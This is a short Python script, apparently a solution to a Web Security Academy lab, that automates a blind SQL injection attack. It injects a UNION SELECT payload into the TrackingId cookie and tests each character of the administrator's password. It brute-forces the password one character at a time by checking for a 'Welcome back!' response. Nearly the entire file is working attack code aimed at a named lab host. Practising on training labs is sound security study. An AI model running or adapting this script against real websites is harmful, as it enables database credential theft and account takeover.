import string

from lib import *

req = FartRequest("""
GET / HTTP/1.1
Host: 0ae100b804df4dd1c0a80f9500720085.web-security-academy.net
Cookie: TrackingId='%20union%20select%20null%20from%20users%20where%20substr(password%2c{len("state")+1}%2c1)%20%3d%20'char'%20and%20username%3d'administrator'--
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae100b804df4dd1c0a80f9500720085.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close


""")

charset = string.ascii_lowercase + string.digits
charset = [x for x in charset]

worker = HttpWorker(req.substitute(char=charset))

looper = FartLooper(worker, "")\
    .get_first(lambda resp: "Welcome back!" in resp.text)\
    .update_with(lambda resp, state: state + resp.payloads[0])\
    .loop()
